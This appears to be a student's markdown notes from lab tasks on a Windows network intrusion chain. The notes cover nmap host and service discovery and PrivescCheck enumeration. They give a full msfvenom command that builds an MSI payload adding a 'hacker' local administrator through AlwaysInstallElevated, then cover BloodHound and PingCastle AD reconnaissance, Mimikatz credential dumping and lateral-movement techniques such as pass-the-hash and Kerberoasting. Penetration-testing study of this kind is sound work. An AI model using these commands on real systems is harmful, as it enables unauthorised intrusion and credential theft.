# Windows Attack example
Based on lab tasks: Maintaining access and Lateral Movement

**Premise**
We have already gained access (infected 2 machines): 
- a linx machine
- a windows machine
    - with ad user tmassie (without local admin rights)
    - tools like Mimikatz, etc. are available 
        - (in a real environment, these tools would be detected)



## 1. Basics, Host + Service discovery
From the Linux machine, we perform analysis of the network
1. `ip -c address list eth0`  (as root): we get our IP and network address
2. Host discovery via Nmap 
    - `nmap -n -Pn --top-ports=10 10.0.1.0/24 -oA nmap_winlab_host_discovery --min-rate=5000` (will write result into file because of -oA)
        - -n -> no DNS resolution
        - --min-rate=5000 -> set a minimum rate to guarantee a timely result
    - `cat nmap_winlab_host_discovery.gnmap | awk '/Up/ {print $2}' | sort -Vu > hosts_winlab.txt` 
        - take result from nmap scan and write ip's into a file (`cat cat hosts_winlab.txt`)
3. Service discovery
    - `nmap -n -sC -sV -iL hosts_winlab.txt -oA nmap_winlab_script_version_scan --min-rate=5000` takes list of Ips and runs service discovery (via -iL param)
        - sC -> Script Scan -> Runs default scripts against known services
        - -sV -> Service/Version detection -> Tries to determine service/version for open ports

## Situational awareness and privilege escalation to local admin

**Windows configuration check with PrivescCheck**
Run PrivescCheck ( https://github.com/itm4n/PrivescCheck ) to get info about windows configuration. 
1. `powershell -exec bypass`
2. `cd C:\temp\tools\PrivescCheck\`
3. `Import-Module .\PrivescCheck.ps1`
4. `Invoke-PrivescCheck` -> we get result with configuration issues. 
    - We might see something like: "CONFIG > WSUS Configuration" or "CONFIG > AlwaysInstallElevated"

**Privilege escalation vie AlwaysInstalledElevated**
We assume the the PrivescCheck has shown we are vulnerable AlwaysInstalledElevated
(allows to run MSI as admin https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated). 
Our goal is now create an msi that creates a local admin and run it. 

1. Create msi metasploit/msfvenom (on linux)
    - `msfvenom -p windows/x64/exec CMD='cmd.exe /k "net user /add hacker Hacker@Work && net localgroup administrators hacker /add"' -f msi > useradd.msi`
        - will create a msi file "useradd.msi" that runs the following code: "net user /add hacker Hacker@Work && net localgroup administrators hacker /add"$
        - User to be created: "hacker" with password "Hacker@Work"
2. Copy file to windows machine
    - any means is possible (web attachment, file share etc.)
    - one way is gosh, as small webserver: https://github.com/patrickhener/gosh (see lab task)
    - attention: when downloading on windows machine, one might have to click away warning
3. Run created msi on linux
    - just run created msi (click away warning) and user is created (even if installer seems to abort)
4. Check
    - run `net user` and `net user hacker` to see if creation was successful
5. run as local admin (hacker)
    - start cmd as admin, pop up will show and we can enter credentials ("hacker", "Hacker@Work")
    - now we can run commands as local admin
        `whoami /groups?` -> we see that our user is in Administrator group and by "Mandatory label\High Mandatory Level" we see it runs in elevated mode

## Active directory info gathering & analysis

1. Runs PingCastle `.\PingCastle.exe` and choose healthcheck to generate result as html. 
https://www.pingcastle.com/PingCastleFiles/ad_hc_rules_list.html


2. Run bloodhound to find potential paths to domain admin
    - collect AD data and import it into bloodhound (for example via SharpHound)
    - find path to domain admin (or whatever we would like to do)
    - *see lab tasks "Maintain Access/AD Information Gathering & Analysis" or "Bloodhound_AD.md*

## Get other credentials from LSASS/SAM 
Using Mimimkatz, we can now get credentials of other (currently logged on) users. (or some other tool would be possible too)
Via Mimikatz we can get credentials (NTLM hashes) from
- LSASS process (AD accounts)
- SAM process (local accounts)
If we get new credentials, we can afterwards update Bloodhound paths (owned flag) to see how much closer we got to our target.

*see lab tasks "Maintain Access/Credential Dumping on Windows 10 Client" or "Mimikatz_Credentials.md*


## Varia/Random
Usually, these steps might have to be applied multiple times (in rounds). Example: from a machine we escalate to local admin, to get AD credentials of another user so we can jump to another machine, to which other users are logged in etc. etc.

## Lateral movement
Various possibilities

- Based on NTLM 
    - pass-the-hash
    - NTLM relay (man-in-the-middle)
    - break NTLM hash (as not that strong)
- Password spraying (get password)

 - bypass firewalls, prevent inspection,  prevent being detected
    - Port forwarding
    - SOCKS Pivoting (???)

- Based on Kerberos
    - "Overpass the hash" -> get a TGT for another tickes via stolen preauthentication data
    - Pass the ticket (TGT)
    - Golden tickets -> forged ticket-granting tickets
    - Silver ticket -> forge a service ticket 
    - Kerberoasting
        - try to get weack hash from service to crack password